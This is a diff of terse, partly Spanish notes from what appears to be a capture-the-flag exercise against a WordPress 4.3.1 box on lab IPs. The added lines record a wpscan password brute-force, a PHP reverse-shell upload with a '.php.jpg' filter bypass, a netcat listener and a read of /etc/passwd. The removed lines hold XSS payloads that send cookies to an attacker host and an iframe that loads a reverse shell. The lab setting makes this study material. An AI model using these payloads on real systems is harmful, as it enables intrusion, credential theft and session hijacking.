@@ -24,53 +24,37 @@ wpscan --url http://10.10.142.130/wp-login.php --usernames Elliot --passwords pa
 [+] Performing password attack on Wp Login against 1 user/s
 [SUCCESS] - Elliot / ER28-0652
 
-wordpress 4.3.1 
-5080.py
-
-
-
 
 http://10.10.155.198/wp-login.php
 WordPress version 4.3.1 identified
-
 
 CVE-2016-1564
 Descripción
 Múltiples vulnerabilidades de secuencias de comandos entre sitios (XSS) en wp-includes/class-wp-theme.php en WordPress antes de 4.4.1 permiten a los atacantes remotos inyectar secuencias de comandos web o HTML arbitrarios a través de un (1) nombre de hoja de estilo o (2) nombre de plantilla a wp-admin/customize.php.
 
+[+]REVERSHELL[+]
+Log in with credentials
+user : Elliot
+pass : ER28-0652
 
-http://10.10.109.130/wp-content/
-interceptamos respuesta y añadimos xss
+http://10.10.142.130/wp-admin/upload.php
+upload revershell.php or // revershell.php.jpg for bypass filter img.
 
-
-sudo ./jsh.py -s 10.18.92.168  -p 4444 -g
-    __
-  |(_  _ |_  _  |  |
-\_|__)_> | |(/_ |  |
-                      v3.1
-
-Payloads:  
- - SVG: <svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.18.92.168:4444/?"+document.cookie},1010)>
- - SCRIPT: <script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.18.92.168:4444/?"+document.cookie},1010)</script>
- - IMG: <img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.18.92.168:4444/?"+document.cookie},1010)>
- - BODY: <body onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.18.92.168:4444/?"+document.cookie}></body>
-
-Listening on [any] 4444 for incoming JS shell ...
+http://10.10.142.130/wp-content/uploads/2022/05/revershell.php
+sudo nc -lvnp 4444
 
 
-s_cc=true;%20s_nr=1652293051000;%20s_sq=%5B%5BB%5D%5D;%20wordpress_test_cookie=WP+Cookie+check;%20s_fid=6EDEAF38FBF48006-08851CC12D5F9DAA
+[+]daemon@linux:/$ whoami daemon[+]
+daemon@linux:/$ hostname -I
+10.10.142.130 
+
+/etc/passwd
+mysql:x:1001:1001::/home/mysql:
+varnish:x:999:999::/home/varnish:
+robot:x:1002:1002::/home/robot:
 
 
-response wp-content
-<iframe src=http://<YOUR IP>/revershell.php height=”0” width=”0”></iframe>
 
-hachbox
-python -m http.server 80
-
-nc -lvnp 5555
-[+]cookie session hijacking not valid. 
-
-[+]WPSCAN[+]
 
 
                             
